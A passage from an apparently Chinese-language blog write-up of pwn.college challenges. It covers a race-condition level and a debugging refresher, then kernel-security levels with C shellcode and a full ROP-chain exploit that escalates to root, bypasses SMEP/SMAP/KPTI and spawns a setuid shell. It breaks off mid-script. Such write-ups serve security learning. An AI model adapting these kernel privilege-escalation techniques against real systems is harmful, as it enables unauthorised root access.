class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babyrace_level1:/$ <span class="hljs-built_in">nice</span> /challenge/babyrace_level1.1 /etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../home/hacker/fuck<br><span class="hljs-comment">###</span><br><span class="hljs-comment">### Welcome to /challenge/babyrace_level1.1!</span><br><span class="hljs-comment">###</span><br><br>Error: failed to get file status!<br>hacker@babyrace_level1:/$ <span class="hljs-built_in">nice</span> /challenge/babyrace_level1.1 /etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../home/hacker/fuck<br><span class="hljs-comment">###</span><br><span class="hljs-comment">### Welcome to /challenge/babyrace_level1.1!</span><br><span class="hljs-comment">###</span><br><br>Error: failed to get file status!<br>hacker@babyrace_level1:/$ <span class="hljs-built_in">nice</span> /challenge/babyrace_level1.1 /etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../home/hacker/fuck<br><span class="hljs-comment">###</span><br><span class="hljs-comment">### Welcome to /challenge/babyrace_level1.1!</span><br><span class="hljs-comment">###</span><br><br>fuckyou<br><span class="hljs-comment">### Goodbye!</span><br>hacker@babyrace_level1:/$ <span class="hljs-built_in">nice</span> /challenge/babyrace_level1.1 /etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../etc/../home/hacker/fuck<br><span class="hljs-comment">###</span><br><span class="hljs-comment">### Welcome to /challenge/babyrace_level1.1!</span><br><span class="hljs-comment">###</span><br><br>pwn.college&#123;48Z1EtMMVlNGg_Q4gVW25KrLrpW.QXyADNscTN1MzW&#125;<br><span class="hljs-comment">### Goodbye!</span><br></code></pre></td></tr></table></figure><h2 id="L2"><a class="header-anchor" href="#L2">Â¶</a>L2</h2><p>å’Œ L1 å¥½åƒæ²¡åŒºåˆ«</p><h2 id="L2-1"><a class="header-anchor" href="#L2-1">Â¶</a>L2.1</h2><h1>Debugging Refresher(8/8)âœ”</h1><p>pwndbg æˆ–è€… gef éƒ½åœ¨ /opt ä¸‹é¢ï¼Œé€‰å–œæ¬¢çš„åŠ è¿› <code>.gdbinit</code> å°±ok äº†ã€‚</p><h2 id="L1-8"><a class="header-anchor" href="#L1-8">Â¶</a>L1~8</h2><p>åŸºæœ¬çš„æ²¡å•¥å¥½è¯´çš„ =-=ï¼Œçœ‹çœ‹æ–‡æ¡£å°± okã€‚åŸºæœ¬å°±æ˜¯ <code>set $rip</code> æˆ–è€…å…¶ä»–çš„å¯„å­˜å™¨è·³æ¥è·³å»ã€‚</p><p>è¿™è¾¹è®²ä¸€ä¸‹é€ƒè¯¾æ‰“æ³•ã€‚<code>p</code> å¯ä»¥è°ƒç”¨å‘½ä»¤ï¼Œæ‰€ä»¥ç›´æ¥ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211171127222.png" alt="image-20221117112715199"></p><p>ä½ ä»¬è¿™ä»€ä¹ˆ gdb å•Šï¼Œå®³äººä¸æµ…å•Šæˆ‘å’Œä½ ä»¬è¯´.jpg ğŸ‘´ğŸ»</p><h1>Kernel Security(24/24)âœ”</h1><h2 id="L1-L1-1"><a class="header-anchor" href="#L1-L1-1">Â¶</a>L1,L1.1</h2><p>ç›´æ¥è¾“å…¥å­—ç¬¦ä¸²å³å¯ï¼ŒL1.1 ç®—æ³•æˆ‘ä¹Ÿæ²¡çœ‹ï¼Œä½†æ˜¯è¾“å…¥å°±å‡º flag äº†.jpg</p><h2 id="L2-L2-1"><a class="header-anchor" href="#L2-L2-1">Â¶</a>L2,L2.1</h2><p>åŒä¸Šï¼Œç„¶å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@vm_babykernel_level2:~$ demsg<br></code></pre></td></tr></table></figure><h2 id="L3-L3-1"><a class="header-anchor" href="#L3-L3-1">Â¶</a>L3,L3.1</h2><p>è¾“å…¥å­—ç¬¦ä¸²æ‹¿åˆ° root åèµ·ä¸ª shell å³å¯ã€‚</p><h2 id="L4-L4-1"><a class="header-anchor" href="#L4-L4-1">Â¶</a>L4,L4.1</h2><p>æ”¹ç”¨ ioctl å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ioctl(kfd,<span class="hljs-number">1337</span>,<span class="hljs-string">&quot;sfueppobgxwkxssc&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="L5-L5-1"><a class="header-anchor" href="#L5-L5-1">Â¶</a>L5,L5.1</h2><p>åˆ‡åˆ° Practice çœ‹ä¸€ä¸‹ <code>/proc/kallsyms</code> å³å¯ã€‚</p><h2 id="L6-L6-1"><a class="header-anchor" href="#L6-L6-1">Â¶</a>L6,L6,1</h2><p>kernel shellcodeï¼Œèµ° <code>commit_creds(prepare_kernel_cred(0))</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sigact</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">register_sigsegv</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] registering default action upon encountering a SIGSEGV&quot;</span>);<br>    sigact.sa_handler = getRootShell; <span class="hljs-comment">// helps to spawn shell :)</span><br>    sigemptyset(&amp;sigact.sa_mask);<br>    sigact.sa_flags = <span class="hljs-number">0</span>;<br>    sigaction(SIGSEGV, &amp;sigact, (<span class="hljs-keyword">struct</span> sigaction*) <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    register_sigsegv();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Wish you every shell...\033[0m\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> kfd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(kfd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the dev!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-type">char</span> shllcode[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0x49</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0xc3</span>&#125;;<br>    write(kfd,shllcode,<span class="hljs-number">0x100</span>);<br>    getRootShell();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="L7-L7-1"><a class="header-anchor" href="#L7-L7-1">Â¶</a>L7,L7.1</h2><p>å…¶å®å°±æ˜¯éœ€è¦å¤šä¼ ä¸ªé•¿åº¦å’Œåœ°å€ =ã€‚=</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> shellcode[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0x49</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0xc3</span>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">u_int64_t</span> shellcode_length;<br>    <span class="hljs-type">char</span>      shellcode[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">u_int64_t</span> shellcode_addr;<br>&#125; <span class="hljs-type">request_t</span>;<br><span class="hljs-type">request_t</span> req;<br><span class="hljs-built_in">memset</span>(&amp;req,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(req));<br>req.shellcode_length = <span class="hljs-number">0x100</span>;<br>req.shellcode_addr   = <span class="hljs-number">0xffffc90000085000</span>;<br><span class="hljs-built_in">memcpy</span>(req.shellcode,shellcode,<span class="hljs-number">0x100</span>);<br>ioctl(kfd,<span class="hljs-number">1337</span>,&amp;req);<br>getRootShell();<br></code></pre></td></tr></table></figure><h2 id="L8-L8-1"><a class="header-anchor" href="#L8-L8-1">Â¶</a>L8,L8.1</h2><p>ç”¨æˆ·æ€å†™ shellcode æ‹¿ write ä¼  kernel å°±è¡Œäº†ã€‚ç›´æ¥æ‰¬æ‰ <code>modprobe_path</code> æ˜¯æœ€ç®€å•çš„ =ã€‚=</p><h2 id="L9-L9-1-L10-L10-1"><a class="header-anchor" href="#L9-L9-1-L10-L10-1">Â¶</a>L9,L9.1,L10,L10.1</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211161940156.png" alt="image-20221116194008759"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/qemu-system-x86_64 <br>-kernel /opt/linux/bzImage <br>-cpu host,smep,smap -fsdev local,id=rootfs,path=/,security_model=passthrough <br>-device virtio-9p-pci,fsdev=rootfs,mount_tag=/dev/root -fsdev local,id=homefs,path=/home/hacker,security_model=passthrough<br>-device virtio-9p-pci,fsdev=homefs,mount_tag=/home/hacker <br>-device e1000,netdev=net0 <br>-netdev user,id=net0,hostfwd=tcp::22-:22 <br>-m 2G <br>-smp 2 <br>-nographic <br>-monitor none <br>-append rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init nokaslr <br>-enable-kvm <br>-s<br></code></pre></td></tr></table></figure><p>å¼€äº† smep å’Œ smap å’Œ KPTIï¼ŒL9 æ²¡å¼€ kaslrï¼ŒL10 å¼€äº†ï¼ˆå¤§åŠ›å‡ºå¥‡è¿¹ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@practice_babykernel_level9:/home/hacker<span class="hljs-comment"># cat /sys/devices/system/cpu/vulnerabilities/*</span><br>KVM: Mitigation: Split huge pages<br>Mitigation: PTE Inversion; VMX: conditional cache flushes, SMT vulnerable<br>Mitigation: Clear CPU buffers; SMT vulnerable<br>Mitigation: PTI<br>Mitigation: Speculative Store Bypass disabled via prctl and seccomp<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, IBPB: conditional, IBRS_FW, STIBP: conditional, RSB filling<br>Not affected<br>Not affected<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>push rdi;pop rsp;ret;</code> è¿™æ ·çš„ gadget è½¬åŒ–ä¸º ropï¼Œç„¶åæ²¡å•¥ç‰¹åˆ«å¥½çš„åŠæ³•ï¼Œçˆ†ç ´å‘—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># gcc exp.c -o exp -no-pie</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a6b700</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8108c420</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810C99D0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xFFFFFFFF810C9540</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81C00FB0</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">add_args</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">u_int64_t</span> size;<br>  <span class="hljs-type">char</span> *buf1;<br>  <span class="hljs-type">char</span> *buf2;<br>&#125;arg;<br><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>, kernel_offset = <span class="hljs-number">0</span>, kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-literal">NULL</span>,init_cred = <span class="hljs-literal">NULL</span>,swapgs_restore_regs_and_return_to_usermode = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">long</span> seq_fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> rop_chain[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">size_t</span> usr_cs, usr_ss, usr_rflags, usr_sp;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[!] FUCKYOU!\033[0m\n&quot;</span>);<br>    setuid(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Now Root!Enjoy your shell...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod u+s /bin/sh&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sigact</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">register_sigsegv</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] registering default action upon encountering a SIGSEGV&quot;</span>);<br>    sigact.sa_handler = getRootShell; <span class="hljs-comment">// helps to spawn shell :)</span><br>    sigemptyset(&amp;sigact.sa_mask);<br>    sigact.sa_flags = <span class="hljs-number">0</span>;<br>    sigaction(SIGSEGV, &amp;sigact, (<span class="hljs-keyword">struct</span> sigaction*) <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>            <span class="hljs-string">&quot;mov usr_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov usr_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov usr_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop usr_rflags;&quot;</span><br>            <span class="hljs-string">&quot;.att_syntax;&quot;</span><br>            );  <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Status saved.\e[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    register_sigsegv();<br>    saveStatus();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Wish you every shell...\033[0m\n&quot;</span>);<br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">2</span>)<br>    &#123;<br>        kernel_offset = atol(argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Now Kernel Offset: 0x%016llx\033[0m\n&quot;</span>,kernel_offset);<br>    &#125;<br><br>    <span class="hljs-type">int</span> kfd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(kfd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the dev!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// system(&quot;echo &#x27;#!/bin/sh\n/bin/cp /bin/sh /tmp/sh\n/bin/chmod u+s /tmp/sh&#x27; &gt; /tmp/aaadprobe&quot;);</span><br>    <span class="hljs-comment">// system(&quot;chmod +x /tmp/aaadprobe&quot;);</span><br>    <span class="hljs-comment">// system(&quot;echo &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/nightu&quot;);</span><br>    <span class="hljs-comment">// system(&quot;chmod +x /tmp/nightu&quot;);</span><br>    <span class="hljs-comment">// system(&quot;/tmp/nightu&quot;);</span><br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0xffffffff81001518</span> + kernel_offset;<br>    rop_chain[idx++] = <span class="hljs-number">0xffffffff82444180</span> + kernel_offset;<br>    rop_chain[idx++] = <span class="hljs-number">0xffffffff81088d90</span> + kernel_offset;<br>    rop_chain[idx++] = <span class="hljs-number">0xffffffff81c00eaa</span> + kernel_offset;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0xffffffff81023d42</span> + kernel_offset;<br>    rop_chain[idx++] = getRootShell;<br>    rop_chain[idx++] = usr_cs;<br>    rop_chain[idx++] = usr_rflags;<br>    rop_chain[idx++] = usr_sp;<br>    rop_chain[idx++] = usr_ss;<br><br>    rop_chain[<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>] = <span class="hljs-number">0xffffffff811aa709</span> + kernel_offset;<br>    write(kfd,rop_chain,<span class="hljs-number">0x108</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          